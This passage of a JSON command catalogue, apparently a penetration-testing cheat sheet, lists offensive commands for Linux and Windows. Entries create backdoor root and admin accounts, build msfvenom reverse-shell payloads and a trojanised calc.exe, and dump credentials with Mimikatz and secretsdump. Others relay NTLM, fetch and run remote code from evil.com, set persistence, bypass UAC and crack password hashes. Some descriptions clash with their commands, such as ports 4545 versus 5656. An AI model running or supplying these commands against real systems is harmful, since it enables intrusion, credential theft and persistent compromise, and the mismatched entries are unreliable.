      "Description": "Examine network connections for a specific port (4545) using netstat to confirm listening services in Linux post-exploitation network enumeration.",
      "Command": "netstat -anp TCP | find \"5656\"",
      "OS": "Win/Lin"
    },
    {
      "Name": "Add Windows Firewall Rule",
      "Category": 17,
      "Description": "Add an inbound Windows firewall rule to allow TCP traffic on port 4545, ensuring port forwards remain accessible in Linux-initiated lateral attacks.",
      "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_5656\" protocol=TCP dir=in localip=192.169.179.65 localport=5656 action=allow",
      "OS": "Windows"
    },
    {
      "Name": "Delete Windows Firewall Rule",
      "Category": 17,
      "Description": "Remove a specific Windows firewall rule to clean up traces of port forwarding configurations after testing in a Linux priv-esc engagement.",
      "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_5656\"",
      "OS": "Windows"
    },
    {
      "Name": "Delete Windows Port Proxy",
      "Category": 17,
      "Description": "Delete a Windows port proxy rule to dismantle forwarding setups and maintain operational security post-Linux privilege escalation activities.",
      "Command": "netsh interface portproxy del v4tov4 listenport=5656 listenaddress=192.169.179.65",
      "OS": "Windows"
    },
    {
      "Name": "Check Current User ID",
      "Category": 9,
      "Description": "Enumerate current user ID, groups, and privileges to identify initial access level and potential escalation paths in a compromised Linux environment.",
      "Command": "id",
      "OS": "Linux"
    },
    {
      "Name": "Get System Hostname",
      "Category": 0,
      "Description": "Retrieve the system's hostname for mapping the target during initial reconnaissance in privilege escalation assessments.",
      "Command": "hostname",
      "OS": "Win/Lin"
    },
    {
      "Name": "Read Login Banner",
      "Category": 0,
      "Description": "Display the login banner from /etc/issue to gather OS and environment details passively for targeted Linux priv-esc planning.",
      "Command": "cat /etc/issue",
      "OS": "Linux"
    },
    {
      "Name": "Get OS Release Info",
      "Category": 0,
      "Description": "Extract distribution and version information from /etc/os-release to identify potential vulnerabilities and exploit compatibility in Linux systems.",
      "Command": "cat /etc/os-release",
      "OS": "Linux"
    },
    {
      "Name": "Show Kernel Details",
      "Category": 0,
      "Description": "Output kernel version, architecture, and build details via uname to scout for known kernel exploits during passive mapping.",
      "Command": "uname -a",
      "OS": "Linux"
    },
    {
      "Name": "Display Route Table",
      "Category": 3,
      "Description": "Display routing table interactively to map network topology and identify lateral movement opportunities in a Linux target.",
      "Command": "routel",
      "OS": "Linux"
    },
    {
      "Name": "List IP Addresses",
      "Category": 3,
      "Description": "Enumerate all network interfaces and IP configurations for interactive network mapping and pivot identification in priv-esc chains.",
      "Command": "ip a",
      "OS": "Linux"
    },
    {
      "Name": "Dump IPTables Rules",
      "Category": 14,
      "Description": "Dump IPv4 firewall rules to assess network restrictions and potential bypasses in a Linux post-exploitation scenario.",
      "Command": "cat /etc/iptables/rules.v4",
      "OS": "Linux"
    },
    {
      "Name": "List Cron Directories",
      "Category": 9,
      "Description": "List cron job directories and files to uncover scheduled tasks that may allow privilege escalation via writable cron entries.",
      "Command": "ls -lah /etc/cron*",
      "OS": "Linux"
    },
    {
      "Name": "List User Crontab",
      "Category": 9,
      "Description": "Display current user's crontab entries to identify automated jobs exploitable for persistent or elevated access in Linux environments.",
      "Command": "crontab -l",
      "OS": "Linux"
    },
    {
      "Name": "List Installed Packages",
      "Category": 9,
      "Description": "List all installed Debian packages to analyze application versions for known vulnerabilities in priv-esc reconnaissance.",
      "Command": "dpkg -l",
      "OS": "Linux"
    },
    {
      "Name": "Find Writable Directories",
      "Category": 9,
      "Description": "Find world-writable directories across the filesystem to locate upload points for malicious payloads in post-exploitation.",
      "Command": "find / -writable -type d 2>/dev/null",
      "OS": "Linux"
    },
    {
      "Name": "List Mount Points",
      "Category": 9,
      "Description": "Examine filesystem mount table to identify mounted volumes, shares, and potential noexec bypasses for escalation techniques.",
      "Command": "cat /etc/fstab",
      "OS": "Linux"
    },
    {
      "Name": "List Block Devices",
      "Category": 9,
      "Description": "List block devices and partitions to map storage layout and detect encrypted or hidden volumes in Linux priv-esc.",
      "Command": "lsblk",
      "OS": "Linux"
    },
    {
      "Name": "List Loaded Modules",
      "Category": 9,
      "Description": "Enumerate loaded kernel modules to spot drivers vulnerable to exploits or version-specific weaknesses.",
      "Command": "lsmod",
      "OS": "Linux"
    },
    {
      "Name": "Query Module Info",
      "Category": 14,
      "Description": "Query details on the libata kernel module to assess for storage-related exploits in targeted priv-esc paths.",
      "Command": "/sbin/modinfo libata",
      "OS": "Linux"
    },
    {
      "Name": "Find SUID Binaries",
      "Category": 9,
      "Description": "Locate setuid executables system-wide to identify privilege escalation vectors via misconfigured SUID files.",
      "Command": "find / -perm -u=s -type f 2>/dev/null",
      "OS": "Linux"
    },
    {
      "Name": "Dump Environment Variables",
      "Category": 9,
      "Description": "Dump environment variables to reveal paths, credentials, or configs exploitable for further escalation in Linux shells.",
      "Command": "env",
      "OS": "Linux"
    },
    {
      "Name": "List Sudo Permissions",
      "Category": 8,
      "Description": "List allowed sudo commands to scout for misconfigurations enabling initial privilege escalation attempts.",
      "Command": "sudo -l",
      "OS": "Linux"
    },
    {
      "Name": "Attempt Root Shell",
      "Category": 8,
      "Description": "Attempt interactive root shell via sudo for direct privilege escalation if permissions allow.",
      "Command": "sudo -i",
      "OS": "Linux"
    },
    {
      "Name": "Monitor Running Processes",
      "Category": 9,
      "Description": "Continuously watch processes for user related activity during post-exploitation sniffing.",
      "Command": "watch -n 1 \"ps -aux | grep '\\['\"",
      "OS": "Linux"
    },
    {
      "Name": "Sniff Loopback Traffic",
      "Category": 9,
      "Description": "Use sudo to capture and grep loopback traffic for plaintext passwords in local inter-process communications.",
      "Command": "sudo tcpdump -i lo -A | grep \"pass\"",
      "OS": "Linux"
    },
    {
      "Name": "Search Cron Logs",
      "Category": 9,
      "Description": "Search syslog for cron execution logs to correlate scheduled jobs with potential escalation timestamps.",
      "Command": "grep \"CRON\" /var/log/syslog",
      "OS": "Linux"
    },
    {
      "Name": "Add Backdoor User",
      "Category": 9,
      "Description": "Append a new root-equivalent user to /etc/passwd for persistent backdoor access post-privilege escalation.",
      "Command": "echo \"mrtheplague:$(openssl passwd x): 0: 0:root:/root:/bin/bash\" >> /etc/passwd",
      "OS": "Linux"
    },
    {
      "Name": "List File Capabilities",
      "Category": 9,
      "Description": "Recursively enumerate file capabilities to uncover binaries with elevated privileges without traditional SUID.",
      "Command": "/usr/sbin/getcap -r / 2>/dev/null",
      "OS": "Linux"
    },
    {
      "Name": "Get Kernel Version",
      "Category": 0,
      "Description": "Extract kernel release version for passive identification of exploitable kernel flaws in Linux mapping.",
      "Command": "uname -r",
      "OS": "Linux"
    },
    {
      "Name": "Get System Architecture",
      "Category": 0,
      "Description": "Determine system architecture to tailor exploits and payloads for architecture-specific vulnerabilities.",
      "Command": "arch",
      "OS": "Linux"
    },
    {
      "Name": "Check File Type",
      "Category": 14,
      "Description": "Identify file type of a test file to verify binaries or scripts for exploitation in misc Linux priv-esc tasks.",
      "Command": "file test-file",
      "OS": "Linux"
    },
    {
      "Name": "Save SAM System Files",
      "Category": 17,
      "Description": "Save SAM and SYSTEM files",
      "Command": "reg save HKLM\\sam sam2 &&  reg save HKLM\\system system2",
      "OS": "Windows"
    },
    {
      "Name": "List Non-System32 Services",
      "Category": 17,
      "Description": "List all services that aren't in the System32 directory",
      "Command": "for /f \"tokens=2 delims=: \" %s in ('sc query state^= all ^| find \"SERVICE_NAME\"') do @sc qc \"%s\" | find \"BINARY_PATH_NAME\" | findstr /v /i \"System32\"",
      "OS": "Windows"
    },
    {
      "Name": "Create Backdoor Admin",
      "Category": 17,
      "Description": "Create a windows backdoor admin account",
      "Command": "net user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add",
      "OS": "Windows"
    },
    {
      "Name": "List User Scheduled Tasks",
      "Category": 17,
      "Description": "List all scheduled tasks that have executables under C:\\Users*",
      "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }",
      "OS": "Windows"
    },
    {
      "Name": "List Unquoted Path Services",
      "Category": 17,
      "Description": "List all services that have unquoted paths",
      "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }",
      "OS": "Windows"
    },
    {
      "Name": "Download File PowerShell",
      "Category": 15,
      "Description": "Download file to windows",
      "Command": "iwr -uri http://192.169.49.4/file.ps1 -Outfile file",
      "OS": "Windows"
    },
    {
      "Name": "Download File Certutil",
      "Category": 17,
      "Description": "Download file to windows",
      "Command": "certutil -UrlCache -f http://host.com/file .\\file",
      "OS": "Windows"
    },
    {
      "Name": "List Network Connections",
      "Category": 17,
      "Description": "List all active network connections and listening ports",
      "Command": "netstat -ano",
      "OS": "Windows"
    },
    {
      "Name": "Display Routing Table",
      "Category": 17,
      "Description": "Display the routing table, which contains all routes of the system",
      "Command": "route print",
      "OS": "Windows"
    },
    {
      "Name": "Display System Information",
      "Category": 17,
      "Description": "Display windows system information",
      "Command": "systeminfo",
      "OS": "Windows"
    },
    {
      "Name": "Dump Hashes Secretsdump",
      "Category": 9,
      "Description": "Dump hashes from sam and system files",
      "Command": "impacket-secretsdump -sam sam -system system local",
      "OS": "Linux"
    },
    {
      "Name": "Execute NTLM Relay",
      "Category": 9,
      "Description": "Execute ntlm smb relay attack",
      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.169.214.212 -c 'your windows command'",
      "OS": "Linux"
    },
    {
      "Name": "Execute PsExec Hash",
      "Category": 9,
      "Description": "Execute psexec on remote machine using NTLM hash Mimikatz",
      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.169.214.213",
      "OS": "Linux"
    },
    {
      "Name": "Elevate System Token Mimikatz",
      "Category": 16,
      "Description": "Elevate to SYSTEM user privileges",
      "Command": "token::elevate",
      "OS": "Windows"
    },
    {
      "Name": "Enable Debug Privilege Mimikatz",
      "Category": 16,
      "Description": "Enable SeDebugPrivilege access right",
      "Command": "privilege::debug",
      "OS": "Windows"
    },
    {
      "Name": "Dump SAM Hashes Mimikatz",
      "Category": 16,
      "Description": "Extract the NTLM hashes from the SAM",
      "Command": "lsadump::sam",
      "OS": "Windows"
    },
    {
      "Name": "Extract Logon Passwords Mimikatz",
      "Category": 16,
      "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
      "Command": "sekurlsa::logonpasswords",
      "OS": "Windows"
    },
    {
      "Name": "List Local Users Powershell",
      "Category": 15,
      "Description": "Get Local Users on Windows Powershell",
      "Command": "Get-LocalUser",
      "OS": "Windows"
    },
    {
      "Name": "Get Computer Information Powershell",
      "Category": 15,
      "Description": "Get Computer Info on Windows",
      "Command": "Get-ComputerInfo",
      "OS": "Windows"
    },
    {
      "Name": "List Local Groups Powershell",
      "Category": 15,
      "Description": "Get Group Info on Windows",
      "Command": "Get-LocalGroup",
      "OS": "Windows"
    },
    {
      "Name": "List Group Members Powershell",
      "Category": 15,
      "Description": "Get Group Member Info on Windows",
      "Command": "Get-LocalGroupMember 'Group Name'",
      "OS": "Windows"
    },
    {
      "Name": "List 32bit Applications Powershell",
      "Category": 15,
      "Description": "List all installed 32bit applications",
      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
      "OS": "Windows"
    },
    {
      "Name": "List 64bit Applications Powershell",
      "Category": 15,
      "Description": "List all installed 64bit applications",
      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
      "OS": "Windows"
    },
    {
      "Name": "List Process Paths Powershell",
      "Category": 15,
      "Description": "List all running processes executable paths",
      "Command": "(Get-Process).Path",
      "OS": "Windows"
    },
    {
      "Name": "List Running Processes Powershell",
      "Category": 15,
      "Description": "List all running processes",
      "Command": "Get-Process",
      "OS": "Windows"
    },
    {
      "Name": "Show PowerShell History Powershell",
      "Category": 15,
      "Description": "Show powershell history for current user",
      "Command": "Get-History",
      "OS": "Windows"
    },
    {
      "Name": "Get History Path Powershell",
      "Category": 15,
      "Description": "Show powershell history file path",
      "Command": "(Get-PSReadlineOption).HistorySavePath",
      "OS": "Windows"
    },
    {
      "Name": "Search KDBX Files Powershell",
      "Category": 15,
      "Description": "Recursive powershell search by wildcard for extension kdbx",
      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
      "OS": "Windows"
    },
    {
      "Name": "Search Event Logs Powershell",
      "Category": 15,
      "Description": "Search windows events by event ID",
      "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message",
      "OS": "Windows"
    },
    {
      "Name": "Grep PowerShell Output Powershell",
      "Category": 15,
      "Description": "Grep powershell command output",
      "Command": "Select-String -Pattern 'search term'",
      "OS": "Windows"
    },
    {
      "Name": "Search Common Files Powershell",
      "Category": 15,
      "Description": "Recursive powershell search by wildcard for common extensions",
      "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
      "OS": "Windows"
    },
    {
      "Name": "List All Services Powershell",
      "Category": 15,
      "Description": "Search for all services, running and stopped, that don't have system32 in the path",
      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}",
      "OS": "Windows"
    },
    {
      "Name": "List Running Services Powershell",
      "Category": 15,
      "Description": "Search for running services that don't have system32 in the path",
      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}",
      "OS": "Windows"
    },
    {
      "Name": "Start System Service",
      "Category": 9,
      "Description": "Starts a specified service using systemctl",
      "Command": "sudo systemctl start servicename",
      "OS": "Linux"
    },
    {
      "Name": "Run Vuln Scan",
      "Category": 5,
      "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
      "Command": "nmap --script vuln -p 80,443 192.168.192.13",
      "OS": "Linux"
    },
    {
      "Name": "Scan Web Vulns Nikto",
      "Category": 5,
      "Description": "Vulnerability scanning with nikto",
      "Command": "nikto -h http://targetip:targetport",
      "OS": "Linux"
    },
    {
      "Name": "Run Nmap Vuln Scripts",
      "Category": 5,
      "Description": "Vulnerability scanning with nmap scripts",
      "Command": "nmap --script-help=http* -v 10.10.10.12",
      "OS": "Linux"
    },
    {
      "Name": "Scan WordPress Vulns",
      "Category": 5,
      "Description": "WordPress security scanner",
      "Command": "wpscan --url http://10.10.10.12/pathtowordpress/",
      "OS": "Linux"
    },
    {
      "Name": "Enum Subdomains FFUF",
      "Category": 6,
      "Description": "Subdomain enumeration with ffuf",
      "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s",
      "OS": "Linux"
    },
    {
      "Name": "Enum Subdomains Wfuzz",
      "Category": 6,
      "Description": "Subdomain enumeration with wfuzz",
      "Command": "wfuzz -c -z file,/path/to/wordlist.txt -H \"Host: FUZZ.target-site.com\" --hw 0 http://target-site.com",
      "OS": "Linux"
    },
    {
      "Name": "Encode Resource Base64",
      "Category": 2,
      "Description": "Uses PHP filter to encode a resource in base64, potentially for data exfiltration",
      "Command": "php://filter/convert.base64-encode/resource=",
      "OS": "Win/Lin"
    },
    {
      "Name": "Execute Encoded Command",
      "Category": 2,
      "Description": "Executes a base64-encoded PHP payload via data URI to run system command 'uname -a'",
      "Command": "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a",
      "OS": "Win/Lin"
    },
    {
      "Name": "Start Python Server",
      "Category": 14,
      "Description": "Creates a simple python http server on port 80",
      "Command": "python3 -m http.server 80 ",
      "OS": "Linux"
    },
    {
      "Name": "Windows Meterpreter Backdoor Metasploit",
      "Category": 21,
      "Description": "Create a Windows Meterpreter backdoor.",
      "Command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o backdoor.exe",
      "OS": "Linux"
    },
    {
      "Name": "Android Meterpreter Payload Metasploit",
      "Category": 21,
      "Description": "Build an Android Meterpreter payload.",
      "Command": "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f apk -o app.apk",
      "OS": "Linux"
    },
    {
      "Name": "PHP Web Shell Metasploit",
      "Category": 21,
      "Description": "Create a PHP web shell.",
      "Command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.php",
      "OS": "Linux"
    },
    {
      "Name": "Java Meterpreter Payload Metasploit",
      "Category": 21,
      "Description": "Generate a Java Meterpreter payload.",
      "Command": "msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f jar -o app.jar",
      "OS": "Linux"
    },
    {
      "Name": "PowerShell Reverse Shell Metasploit",
      "Category": 21,
      "Description": "Create a PowerShell reverse shell.",
      "Command": "msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.1 LPORT=4444 -f psh -o script.ps1",
      "OS": "Linux"
    },
    {
      "Name": "Encoded Windows Payload Metasploit",
      "Category": 21,
      "Description": "Encode a Windows payload for evasion.",
      "Command": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe",
      "OS": "Linux"
    },
    {
      "Name": "Null-Free Linux Payload Metasploit",
      "Category": 21,
      "Description": "Generate a Linux payload without null bytes.",
      "Command": "msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -b \"\\x00\" -f elf -o safe.elf",
      "OS": "Linux"
    },
    {
      "Name": "C Shellcode Output Metasploit",
      "Category": 21,
      "Description": "Output a payload in C format.",
      "Command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f c -o shellcode.c",
      "OS": "Linux"
    },
    {
      "Name": "Python Meterpreter Output Metasploit",
      "Category": 21,
      "Description": "Output a Python Meterpreter payload.",
      "Command": "msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f py -o shell.py",
      "OS": "Linux"
    },
    {
      "Name": "VBA Macro Payload Metasploit",
      "Category": 21,
      "Description": "Create a VBA payload for Office macros.",
      "Command": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f vba -o macro.vba",
      "OS": "Linux"
    },
    {
      "Name": "AES-Encrypted Payload Metasploit",
      "Category": 21,
      "Description": "Encrypt a payload with AES-256.",
      "Command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --encrypt aes256 -f exe -o secure.exe",
      "OS": "Linux"
    },
    {
      "Name": "Template Injection Payload Metasploit",
      "Category": 21,
      "Description": "Inject payload into calc.exe.",
      "Command": "msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --template calc.exe -f exe -o calc_backdoor.exe",
      "OS": "Linux"
    },
    {
      "Name": "Base64-Encoded Python Payload Metasploit",
      "Category": 21,
      "Description": "Encode a Python payload in Base64.",
      "Command": "msfvenom -p python/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f py | base64",
      "OS": "Linux"
    },
    {
      "Name": "PowerShell Payload Execution Metasploit",
      "Category": 21,
      "Description": "Run a PowerShell payload",
      "Command": "msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.1 LPORT=4444 -f psh | powershell -EncodedCommand",
      "OS": "Linux"
    },
    {
      "Name": "Linux Reverse Shell Metasploit",
      "Category": 21,
      "Description": "Generate a Linux reverse shell.",
      "Command": "msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf",
      "OS": "Linux"
    },
    {
      "Name": "Crack Linux Shadow File John",
      "Category": 13,
      "Description": "Targets SHA-512 hashed passwords in Linux shadow file.",
      "Command": "john --format=sha512crypt /etc/shadow",
      "OS": "Linux"
    },
    {
      "Name": "Crack Windows NTLM Hashes John",
      "Category": 13,
      "Description": "Cracks NTLM hashes from Windows system dump.",
      "Command": "john --format=nt nt_hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Wordlist with Rules Cracking John",
      "Category": 13,
      "Description": "Applies mangling rules to rockyou.txt for MD5 hashes.",
      "Command": "john --wordlist=rockyou.txt --rules --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Brute-Force Mask Cracking John",
      "Category": 13,
      "Description": "Tries 4 lowercase letters and 2 digits for SHA-1.",
      "Command": "john --mask=?l?l?l?l?d?d --format=raw-sha1 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Crack ZIP Archive Password John",
      "Category": 13,
      "Description": "Cracks ZIP archive password.",
      "Command": "zip2john archive.zip > zip.hash john --format=zip zip.hash",
      "OS": "Linux"
    },
    {
      "Name": "Crack PDF Password John",
      "Category": 13,
      "Description": "Cracks PDF document password.",
      "Command": "pdf2john document.pdf > pdf.hash john --format=pdf pdf.hash",
      "OS": "Linux"
    },
    {
      "Name": "Single Crack Mode John",
      "Category": 13,
      "Description": "Cracks weak passwords using username/GECOS data.",
      "Command": "john --single --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Show Cracked Passwords John",
      "Category": 13,
      "Description": "Displays cracked passwords from hashes.txt.",
      "Command": "john --show hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Restore Interrupted Session John",
      "Category": 13,
      "Description": "Resumes last interrupted session.",
      "Command": "john --restore",
      "OS": "Linux"
    },
    {
      "Name": "GPU Accelerated Cracking John",
      "Category": 13,
      "Description": "Uses GPU for faster SHA-512 cracking.",
      "Command": "john --format=sha512crypt-opencl --device=0 /etc/shadow",
      "OS": "Linux"
    },
    {
      "Name": "Crack Bcrypt Hashes John",
      "Category": 13,
      "Description": "Targets bcrypt hashes.",
      "Command": "john --format=bcrypt hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Custom Charset Cracking John",
      "Category": 13,
      "Description": "Uses custom charset for MD5 brute-forcing.",
      "Command": "john --make-charset=custom.chr john --incremental=custom --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Multi-Process Cracking John",
      "Category": 13,
      "Description": "Runs 4 parallel processes for SHA-256 cracking.",
      "Command": "john --fork=4 --format=raw-sha256 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Crack Specific Users John",
      "Category": 13,
      "Description": "Cracks passwords for root and admin.",
      "Command": "john --users=root,admin --format=sha512crypt /etc/shadow",
      "OS": "Linux"
    },
    {
      "Name": "Loopback Mode Cracking John",
      "Category": 13,
      "Description": "Reuses cracked passwords as wordlist for MD5.",
      "Command": "john --wordlist=rockyou.txt --rules --loopback --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Mask and Wordlist Cracking John",
      "Category": 13,
      "Description": "Appends two digits to wordlist entries for SHA-1.",
      "Command": "john --wordlist=rockyou.txt --mask=?w?d?d --format=raw-sha1 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Show Progress Every Minute John",
      "Category": 13,
      "Description": "Displays progress every 60 seconds.",
      "Command": "john --progress-every=60 --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "External Mode Cracking John",
      "Category": 13,
      "Description": "Uses external filter for MD5 candidates.",
      "Command": "john --external=filter_latin1 --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Specific Encoding Cracking John",
      "Category": 13,
      "Description": "Uses UTF-8 encoding for wordlists.",
      "Command": "john --encoding=utf8 --format=raw-md5 hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Bcrypt Cost Range Cracking John",
      "Category": 13,
      "Description": "Targets bcrypt hashes with cost factors 10 to 12.",
      "Command": "john --costs=10:12 --format=bcrypt hashes.txt",
      "OS": "Linux"
    },
    {
      "Name": "Execute PowerShell Command",
      "Category": 15,
      "Description": "Execute PowerShell commands",
      "Command": "powershell -c <command>",
      "OS": "Windows"
    },
    {
      "Name": "Run Basic Shell Command",
      "Category": 17,
      "Description": "Run basic shell commands",
      "Command": "cmd /c <command>",
      "OS": "Windows"
    },
    {
      "Name": "Execute HTA File",
      "Category": 8,
      "Description": "Execute HTA files",
      "Command": "mshta http://evil.com/mal.hta",
      "OS": "Windows"
    },
    {
      "Name": "Load Malicious DLL",
      "Category": 8,
      "Description": "Load malicious DLLs",
      "Command": "rundll32.exe evil.dll,EntryPoint",
      "OS": "Windows"
    },
    {
      "Name": "Install Payload Silently",
      "Category": 8,
      "Description": "Install payloads silently",
      "Command": "msiexec /q /i http://evil.com/payload.msi",
      "OS": "Windows"
    },
    {
      "Name": "Spawn Process via WMI",
      "Category": 17,
      "Description": "Spawn processes via WMI",
      "Command": "wmic process call create \"cmd.exe /c evil.exe\"",
      "OS": "Windows"
    },
    {
      "Name": "Loop Execution",
      "Category": 17,
      "Description": "Loop execution",
      "Command": "forfiles /p c:\\ /c \"cmd /c evil.exe\"",
      "OS": "Windows"
    },
    {
      "Name": "Escalate via Program Compatibility",
      "Category": 9,
      "Description": "Escalate via program compatibility",
      "Command": "pcalua -a evil.exe",
      "OS": "Windows"
    },
    {
      "Name": "Run Script via DLL",
      "Category": 8,
      "Description": "Run scripts via DLL",
      "Command": "regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll",
      "OS": "Windows"
    },
    {
      "Name": "Execute INF File",
      "Category": 8,
      "Description": "Execute INF files",
      "Command": "cmstp /ni /s evil.inf",
      "OS": "Windows"
    },
    {
      "Name": "Run VBScript",
      "Category": 8,
      "Description": "Run VBScripts",
      "Command": "wscript script.vbs",
      "OS": "Windows"
    },
    {
      "Name": "Run Script Silently",
      "Category": 8,
      "Description": "Run scripts silently",
      "Command": "cscript script.vbs",
      "OS": "Windows"
    },
    {
      "Name": "Launch in New Window",
      "Category": 17,
      "Description": "Launch in new window",
      "Command": "start cmd /c evil.exe",
      "OS": "Windows"
    },
    {
      "Name": "Use Alternate Credentials",
      "Category": 17,
      "Description": "Use alternate credentials",
      "Command": "runas /user:hacker cmd.exe",
      "OS": "Windows"
    },
    {
      "Name": "Install Updates with Payloads",
      "Category": 8,
      "Description": "Install updates with payloads",
      "Command": "wusa evil.msu /quiet",
      "OS": "Windows"
    },
    {
      "Name": "Schedule Daily Tasks",
      "Category": 9,
      "Description": "Schedule daily tasks",
      "Command": "schtasks /create /tn \"Task\" /tr \"cmd.exe\" /sc daily",
      "OS": "Windows"
    },
    {
      "Name": "Add to Startup Registry",
      "Category": 9,
      "Description": "Add to startup",
      "Command": "reg add HKCU\\Software\\Run /v Evil /t REG_SZ /d \"cmd.exe\"",
      "OS": "Windows"
    },
    {
      "Name": "Create Persistent Service",
      "Category": 9,
      "Description": "Create persistent service",
      "Command": "sc create EvilService binpath=\"cmd.exe /c evil.exe\"",
      "OS": "Windows"
    },
    {
      "Name": "Legacy Task Scheduling",
      "Category": 9,
      "Description": "Legacy task scheduling",
      "Command": "at 12:00 cmd.exe /c evil.exe",
      "OS": "Windows"
    },
    {
      "Name": "Persist via WMI",
      "Category": 9,
      "Description": "Persist via WMI",
      "Command": "mofcomp evil.mof",
      "OS": "Windows"
    },
    {
      "Name": "Hijack File Associations",
      "Category": 9,
      "Description": "Hijack file associations",
      "Command": "assoc .txt=evil.exe",
      "OS": "Windows"
    },
    {
      "Name": "Link File Types to Payloads",
      "Category": 9,
      "Description": "Link file types to payloads",
      "Command": "ftype txtfile=evil.exe \"%1\"",
      "OS": "Windows"
    },
    {
      "Name": "Alter Boot Config",
      "Category": 9,
      "Description": "Alter boot config",
      "Command": "bcdedit /set {default} safeboot network",
      "OS": "Windows"
    },
    {
      "Name": "Bypass UAC via Registry",
      "Category": 9,
      "Description": "Bypass UAC via registry",
      "Command": "eventvwr",
      "OS": "Windows"
    },
    {
      "Name": "Elevate Silently",
      "Category": 9,
      "Description": "Elevate silently",
      "Command": "fodhelper",
      "OS": "Windows"
    },
    {
      "Name": "Trigger Elevated Process",
      "Category": 9,
      "Description": "Trigger elevated process",
      "Command": "sdclt /kickoffelev",
      "OS": "Windows"
    },
    {
      "Name": "Download Files with Bitsadmin",
      "Category": 17,
      "Description": "Download files",
      "Command": "bitsadmin /transfer job /download /priority normal http://evil.com/file.exe C:\file.exe",
      "OS": "Windows"
    },
    {
      "Name": "Fetch Files with Certutil",
      "Category": 17,
      "Description": "Fetch files",
      "Command": "certutil -urlfetch -f http://evil.com/file.exe file.exe",
      "OS": "Windows"
    },
    {
      "Name": "PowerShell Download",
      "Category": 15,
      "Description": "PowerShell download",
      "Command": "IWR -Uri http://evil.com/file -OutFile file.exe",
      "OS": "Windows"
    },
    {
      "Name": "Decode Base64 Files with Certutil",
      "Category": 17,
      "Description": "Decode base64 files",
      "Command": "certutil -decode encoded.txt decoded.exe",
      "OS": "Windows"
    },
    {
      "Name": "List Processes with WMIC",
      "Category": 17,
      "Description": "List processes",
      "Command": "wmic process list",
      "OS": "Windows"
    },
    {
      "Name": "Create Users with Net",
      "Category": 17,
      "Description": "Create users",
      "Command": "net user /add hacker password",
      "OS": "Windows"
    },
    {
      "Name": "Show Network Connections",
      "Category": 17,
      "Description": "Show network connections",
      "Command": "netstat -ano",
      "OS": "Windows"
    },
    {
      "Name": "Display Network Config",
      "Category": 17,
      "Description": "Display network config",
      "Command": "ipconfig /all",
      "OS": "Windows"
    },
    {
      "Name": "Check User Privileges",
      "Category": 17,
      "Description": "Check user privileges",
